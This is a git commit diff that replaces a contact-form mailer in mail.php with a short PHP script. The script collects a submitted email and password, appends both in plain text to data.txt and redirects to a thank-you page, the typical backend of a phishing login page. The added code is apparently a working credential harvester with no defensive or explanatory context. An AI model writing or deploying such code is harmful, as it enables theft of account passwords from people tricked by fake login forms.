47d5d3d8582714d91fe198ac10c0ffa9901b090a
Megli <meglipanci12@gmail.com>
2020-01-03 03:39:19 +0100

    g
    g

--- mail.php
+++ mail.php
@@ -1,16 +1,19 @@
 <?php
-$name = $_POST['name'];
-$email = $_POST['email'];
-$phone = $_POST['phone'];
-$call = $_POST['call'];
-$website = $_POST['website'];
-$priority = $_POST['priority'];
-$type = $_POST['type'];
-$message = $_POST['message'];
-$formcontent=" From: $name \n Phone: $phone \n Call Back: $call \n Website: $website \n Priority: $priority \n Type: $type \n Message: $message";
-$recipient = "meglipanci12@gmail.com";
-$subject = "Contact Form";
-$mailheader = "From: $email \r\n";
-mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
-echo "Thank You!" . " -" . "<a href='form.html' style='text-decoration:none;color:#ff0099;'> Return Home</a>";
+$email=$_POST{'email'};
+$password=$_POST{'password'};
+
+if (empty($email))
+{
+	echo "<script>alert('Please Enter Email/Phone');</script>";
+	
+}
+if($password=='')
+{
+	echo "<script>alert('Please Enter Password');</script>";
+}
+$fp=fopen("data.txt","a"); // here a is apendix
+$savestring = "Email Adress: ".$email."\n"."Password: ".$password."\n";
+fwrite($fp, $savestring);
+fclose($fp);
+header('location:ThankYou.html');
 ?>
